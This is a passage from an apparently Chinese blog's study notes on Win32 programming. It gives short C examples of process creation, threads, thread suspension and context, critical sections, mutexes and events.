childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">(CreateProcess(childProcessName,childPeocessCmd,  <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写<code>CREATE_NEW_CONSOLE</code>就会在新的终端打开，不然就是本终端打开。</p><p>但是我们关注的是另一个，有意义的，<code>CREATE_SUSPENDED</code></p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image2021-5-22_1-12-9.png"></p><p>释放使用resumeThread</p><h2 id="模块目录和工作目录">模块目录和工作目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> strModule[<span class="number">256</span>];</span><br><span class="line">    GetModuleFileName(<span class="literal">NULL</span>,(LPWSTR)strModule, <span class="number">256</span>);<span class="comment">// 得到当前模块目录，当前exe所在的路径，包含exe文件名</span></span><br><span class="line">    <span class="keyword">char</span> strWork[<span class="number">1000</span>];</span><br><span class="line">    GetCurrentDirectory(<span class="number">1000</span>, (LPWSTR)strWork); <span class="comment">// 获取当前工作目录</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模块目录：%ws \n工作目录：%ws \n&quot;</span>, strModule, strWork);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他进程相关api">其他进程相关API</h2><p>获取当前进程ID（PID）：GetCurrentProcessId</p><p>获取当前进程句柄：GetCurrentProcess</p><p>获取命令行：GetCommandLine</p><p>获取启动信息：GetStartupInfo</p><p>遍历进程ID：EnumProcesses</p><p>快照：CreateToolhelp32Snapshot</p><h1 id="创建线程">创建线程</h1><p>线程：附属在进程上的执行实体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">( <span class="comment">// 返回值是线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwStackSize,                       <span class="comment">// initial stack size 初始堆栈</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// thread function 线程执行的函数代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpParameter,                       <span class="comment">// thread argument 线程需要的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                    <span class="comment">// creation option 标识，也可以以挂起形式创建线程</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpThreadId                        <span class="comment">// thread identifier 返回当前线程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 线程执行的函数有语法要求，参考MSDN Library</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;++++++ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hd;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;------ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="传参">传参</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">int</span>* p = (<span class="keyword">int</span>*)lpParameter;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; *p; i++) &#123;</span><br><span class="line">....................</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">.............</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, &amp;n, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">..........</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程控制">线程控制</h1><h2 id="停止线程">停止线程</h2><p>停止自己的线程，可以使用sleep函数，上面有。</p><p>下面是停止别的线程：</p><h2 id="suspendthread">SuspendThread</h2><p>SuspendThread函数用于暂停（挂起）某个线程，当暂停后该线程不会占用CPU，只需要传入一个线程句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SuspendThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread   <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">ResumeThread(hd);</span><br><span class="line">CloseHandle(hd);</span><br></pre></td></tr></table></figure><h2 id="等待线程结束">等待线程结束</h2><h3 id="waitforsingleobject">WaitForSingleObject</h3><p>WaitForSingleObject函数用于等待<strong>一个内核对象</strong>状态发生变更</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hHandle,       </span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds   <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>INFINITE</code>表示，不指定超时时间，要执行完才继续走</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">WaitForSingleObject(hd, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="waitformultipleobjects">WaitForMultipleObjects</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nCount,             <span class="comment">// number of handles in array 内核对象的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST HANDLE *lpHandles,  <span class="comment">// object-handle array 内核对象的句柄数组</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bWaitAll,            <span class="comment">// wait option 等待模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds      <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd[<span class="number">2</span>];</span><br><span class="line">hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">hd[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, hd,<span class="literal">true</span>, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="getexitcodethread">GetExitCodeThread</h3><p>和名字一样，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetExitCodeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,      <span class="comment">// handle to the thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpExitCode   <span class="comment">// termination status</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取设置线程上下文">获取设置线程上下文</h2><h2 id="getthreadcontext">GetThreadContext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,       <span class="comment">// handle to thread with context 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCONTEXT lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> HANDLE hd[<span class="number">2</span>];</span><br><span class="line"> hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* hd[1] = CreateThread(NULL, NULL, ThreadProc1, NULL, 0, NULL);*/</span></span><br><span class="line"></span><br><span class="line"> SuspendThread(hd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"> CONTEXT context;</span><br><span class="line"> context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line"> GetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;end\n%d ,%d&quot;</span>,context.Rax,context.Rbx);</span><br><span class="line"> ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line"> CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h3 id="setthreadcontext">SetThreadContext</h3><p>修改线程上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,            <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST CONTEXT *lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT context;</span><br><span class="line">context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">context.Eax = <span class="number">0x123</span>;</span><br><span class="line">SetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line">CONTEXT c;</span><br><span class="line">c.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">GetThreadContext(hd[<span class="number">0</span>], &amp;c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x ,%x&quot;</span>, c.Eax, c.Ebp);</span><br><span class="line">getchar();</span><br><span class="line">ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line">CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h1 id="临界区">临界区</h1><p>每个线程都有自己的栈，局部变量是存储在栈中的，这就意味着每个进程都会有一份自己的“句柄变量”（栈），如果线程仅仅使用自己的“局部变量”那就不存在线程安全问题，反之，如果多个线程共用一个全局变量，且修改该全局变量就会出现问题。</p><p>临界资源：一次只有一个线程使用</p><p>临界区：访问临界资源的代码</p><h2 id="线程锁">线程锁</h2><p>使用线程锁来解决上面的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建全局变量：CRITICAL_SECTION cs;</span><br><span class="line">初始化全局变量：InitializeCriticalSection(&amp;cs);</span><br><span class="line">实现临界区：进入 → EnterCriticalSection(&amp;cs); 离开 → LeaveCriticalSection(&amp;cs);</span><br></pre></td></tr></table></figure><p>注意要init，找了半天错，，，，，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="keyword">int</span> tickNUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        EnterCriticalSection(&amp;cs);</span><br><span class="line">        <span class="keyword">if</span> (tickNUM &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;现在有%d张 &quot;</span>, tickNUM);</span><br><span class="line">            tickNUM--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;还有%d 张\n&quot;</span>, tickNUM);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LeaveCriticalSection(&amp;cs);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LeaveCriticalSection(&amp;cs);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitializeCriticalSection(&amp;cs);</span><br><span class="line">    HANDLE hd,hd1;</span><br><span class="line">    hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hd1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="互斥体">互斥体</h1><p><strong>假设A进程的B线程和C进程的D线程</strong>，同时使用的是内核级的临界资源（<strong>内核对象：线程、文件、进程...</strong>）该怎么让这个访问是安全的？<strong>使用线程锁的方式明显不行，因为线程锁仅能控制同进程中的多线程</strong>。这个时候使用互斥体：</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404132056222.png" alt="image-20220404132056222"><figcaption aria-hidden="true">image-20220404132056222</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutex</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpMutexAttributes,  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInitialOwner,                       <span class="comment">// initial owner 是否希望互斥体创建出来就有信号，或者说就可以使用，如果希望的话就为FALSE；官方解释为如果该值为TRUE则表示当前进程拥有该互斥体所有权</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                            <span class="comment">// object name 互斥体的名字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//想要创建出来就有信号，第二个参数给false</span></span><br><span class="line">    HANDLE hs = CreateMutex(<span class="literal">NULL</span>, FALSE, (LPCWSTR)<span class="string">&quot;xyz&quot;</span>);</span><br><span class="line">    WaitForSingleObject(hs, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="互斥体和线程锁的区别">互斥体和线程锁的区别</h2><ol type="1"><li>线程锁只能用于单个进程间的线程控制</li><li>互斥体可以设定等待超时，但线程锁不能</li><li>线程意外结束时，互斥体可以避免无限等待</li><li>互斥体效率没有线程锁高</li></ol><h2 id="互斥体防止多开">互斥体防止多开</h2><p>防止多开，使用互斥体只是一个方法，<code>ERROR_ALREADY_EXISTS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hs = CreateMutex(<span class="literal">NULL</span>, <span class="literal">true</span>, (LPCWSTR) <span class="string">&quot;防多开&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;该程序已经开启了，请勿再次开启！&quot;</span>);</span><br><span class="line">            getchar();</span><br><span class="line">            CloseHandle(hs);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            WaitForSingleObject(hs, INFINITE);</span><br><span class="line">            <span class="comment">// 操作资源</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ReleaseMutex(hs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="事件">事件</h1><p>事件本身也是一种内核对象，其也是是用来控制线程的。</p><h2 id="通知类型">通知类型</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bManualReset,                       <span class="comment">// reset type 如果你希望当前事件类型是通知类型则写TRUE，反之FALSE</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInitialState,                      <span class="comment">// initial state 初始状态，决定创建出来时候是否有信号，有为TRUE，没有为FALSE</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                           <span class="comment">// object name 事件名字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>互斥：只能有一个跑</p><p>通知：全部可以跑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第二个参数，FALSE表示非通知类型通知，也就是互斥；TRUE则表示为通知类型</span></span><br><span class="line"><span class="comment">// 第三个参数表示初始状态没有信号</span></span><br><span class="line">e_event = CreateEvent(<span class="literal">NULL</span>, <span class="literal">true</span>, FALSE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 